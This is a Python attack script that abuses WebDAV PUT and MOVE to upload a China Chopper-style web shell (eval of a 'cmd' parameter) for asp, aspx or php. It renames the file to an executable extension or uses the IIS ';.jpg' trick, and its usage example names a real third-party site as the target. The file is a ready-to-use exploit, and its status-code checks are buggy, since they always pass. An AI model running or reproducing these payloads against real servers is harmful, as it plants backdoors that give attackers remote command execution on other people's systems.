#!/usr/bin/env python
#coding:utf-8

import os,sys
import urllib2

def main(script_types,url):

    payloads = {'asp':'<% eval request("cmd") %>',
                'aspx':'<% @page Language="Jscript"><%eval(Request.item["cmd"],"unsafe");%>',
                'php':'<?php @eval($_POST[cmd]);?>'
                }
        #china chopper tronjan script code 

    payload = payloads[script_types] #
    des = [url+'/test123456.'+script_types,url+'/test123456.'+script_types+';.jpg']
    #two name,one of is xxx.asp,another is xxx.asp;.jpg,iis can userd!

    def http_move(url,head): #MOVE the txt to asp or ... page
        request = urllib2.Request(url)
        request.headers = head
        request.get_method = lambda:'MOVE'      
        request = urllib2.urlopen(request)
        return request.code

    def check(url):  #Check the webdav is true 
        request = urllib2.Request(url)
        request.get_method = lambda:'OPTIONS'
        request = urllib2.urlopen(request)
        head = request.headers
        if (request.code ==200) and ("PUT" and "MOVE") in head['allow']: 
            print "[*]PUT and MOVE method is allowd on this url..."
        else:
            print "[*]The webdav is not exists on this url..."
            os._exit(0)
        return head

    def http_put(url,data):  #put a txt to server
        request = urllib2.Request(url,data)
        request.get_method = lambda:'PUT'          
        request = urllib2.urlopen(request)
        return request.code

    ck_head = check(url)  # Get the headers
    head_0=head_1=ck_head

    back_code=http_put(url+'/test123456.txt',payload)
    if back_code == 201 or 200:  #if put sussess ,status code will be 201,or has putted,code is 200!
        print "[*]test123456.txt put sussessful..."
        head_0['Destination']=des[0] #add headers 'destination' key,value is xxx.asp
        re_code = http_move(url+'/test123456.txt',head_0)

        if re_code ==201 or 204:#move sussess status code is 201 or has moved ,code is 204
            print "[*] "+des[0]+" created sussessful,pwd 'cmd'.."
        else:
            head_1['Destination']=des[-1]#add headers 'destination' key,value is xxx.asp;.jpg
            re_code=http_move(url+'/test123456.txt',head_1)
            if re_code ==201 or 204:
                print "[*]"+des[1]+" created sussessful,pwd 'cmd'.."
            else:
                print "[*]Failure move file..." 
    else:
        print "[*]Failure put file!..."

def help():
    try:
        os.system("clear")
    except:
        os.system("cls")
    print'''
[*]Example: python webdav.py -t asp http://www.baidu.com/admin
[*]-t: <asp|aspx|php>
[*]For more : http://www.yzqy.cc    By:yzqycn [2015/09/21]
-----------------------------------------------------------'''

if __name__ == '__main__':
    try:
        types = ['asp','aspx','php']
        help()
        if len(sys.argv)<4:
            help()
            os._exit(0)
        elif "-t" in sys.argv:
            _type = sys.argv[-2]
            if not _type in types:
                help()
                os._exit(0)
        try:
            main(_type,sys.argv[-1])
        except Exception,e:
            print "[*]",e
    except KeyboardInterrupt:
        print "[*]Program exited..."
        os._exit(0)
